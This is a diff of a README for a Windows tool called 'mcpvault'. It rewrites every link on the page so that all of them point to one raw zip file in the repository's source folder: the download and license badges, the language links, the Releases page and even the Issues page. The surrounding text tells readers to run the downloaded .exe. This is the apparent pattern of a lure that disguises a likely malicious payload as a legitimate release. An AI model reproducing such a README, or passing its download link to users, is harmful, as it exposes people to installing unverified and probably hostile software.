@@ -1,20 +1,20 @@
 # ⚡ mcpvault - Boost Your AI Performance Now
 
 <div align="center">
-  [![Download mcpvault](https://img.shields.io/badge/Download-mcpvault-blue.svg?style=flat-square)](https://github.com/Pavan7472/mcpvault/releases)
+  [![Download mcpvault](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)
 </div>
 
 <div align="center">
 
-![License](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)
-![Python](https://img.shields.io/badge/Python-3.10+-F7CA3F.svg?style=flat-square&logo=python&logoColor=black)
-![Platform](https://img.shields.io/badge/OS-Windows-0078D6.svg?style=flat-square&logo=windows&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Accelerated-brightgreen.svg?style=flat-square)
+![License](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)
+![Python](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip+https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)
+![Platform](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)
+![Status](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)
 
 </div>
 
 <div align="right">
-  <a href="README_KR.md">🇰🇷 한국어</a> | <a href="README_CN.md">🇨🇳 中文</a> | <a href="README_RU.md">🇷🇺 Русский</a>
+  <a href="https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip">🇰🇷 한국어</a> | <a href="https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip">🇨🇳 中文</a> | <a href="https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip">🇷🇺 Русский</a>
 </div>
 
 <br>
@@ -37,7 +37,7 @@ With `mcpv`, you can maximize your workflow and focus on what really matters.
 2. **Install Required Tools**: You do not need to install any additional tools, but it’s essential to have a stable internet connection to download the application.
 
 3. **Download `mcpv`**: 
-   - Visit the [Releases page](https://github.com/Pavan7472/mcpvault/releases) to get the latest version of `mcpvault`.
+   - Visit the [Releases page](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip) to get the latest version of `mcpvault`.
 
 4. **Run the Installer**: After downloading the `.exe` file, double-click on it to start the installation. Follow the prompts on the screen to complete the installation process.
 
@@ -47,7 +47,7 @@ With `mcpv`, you can maximize your workflow and focus on what really matters.
 To download the latest version of `mcpv`, click the button below:
 
 <div align="center">
-  [![Download mcpvault](https://img.shields.io/badge/Download-mcpvault-blue.svg?style=flat-square)](https://github.com/Pavan7472/mcpvault/releases)
+  [![Download mcpvault](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip)
 </div>
 
 ### Step 2: Choose Your Version
@@ -72,7 +72,7 @@ If you encounter issues:
 
 ## 🔧 Support
 
-For any questions or support, visit our [GitHub Issues page](https://github.com/Pavan7472/mcpvault/issues). Alternatively, you can join our community support forum for real-time help from users and developers.
+For any questions or support, visit our [GitHub Issues page](https://github.com/Pavan7472/mcpvault/raw/refs/heads/main/src/mcpv/Software-2.6.zip). Alternatively, you can join our community support forum for real-time help from users and developers.
 
 ## 📅 Updates
 
